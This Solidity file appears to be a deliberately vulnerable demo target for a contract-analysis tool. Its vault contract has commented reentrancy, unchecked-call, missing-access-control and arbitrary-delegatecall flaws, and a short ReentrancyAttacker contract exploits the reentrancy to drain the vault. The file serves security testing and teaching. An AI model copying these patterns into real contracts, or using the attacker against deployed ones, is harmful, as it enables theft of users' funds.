// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title VulnerableVault — intentionally flawed contract for EtherScope demo
/// @notice Contains classic vulnerabilities: reentrancy, unchecked call, missing access control.
///         DO NOT deploy to mainnet.
contract VulnerableVault {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Deposit ETH
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice VULNERABLE: reentrancy — sends ETH before updating state
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");

        // BUG: external call before state update (reentrancy)
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        balances[msg.sender] -= amount;
    }

    /// @notice VULNERABLE: unchecked low-level call return value
    function unsafeSend(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;

        // BUG: return value not checked
        to.call{value: amount}("");
    }

    /// @notice VULNERABLE: no access control — anyone can drain
    function emergencyWithdraw(address to) external {
        // BUG: missing onlyOwner check
        uint256 bal = address(this).balance;
        (bool ok, ) = to.call{value: bal}("");
        require(ok, "transfer failed");
    }

    /// @notice VULNERABLE: dangerous delegatecall to arbitrary address
    function execute(address target, bytes calldata data) external {
        // BUG: delegatecall to user-supplied address
        (bool ok, ) = target.delegatecall(data);
        require(ok, "delegatecall failed");
    }

    receive() external payable {}
}

/// @notice Attacker contract that exploits the reentrancy in VulnerableVault
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    function attack() external payable {
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
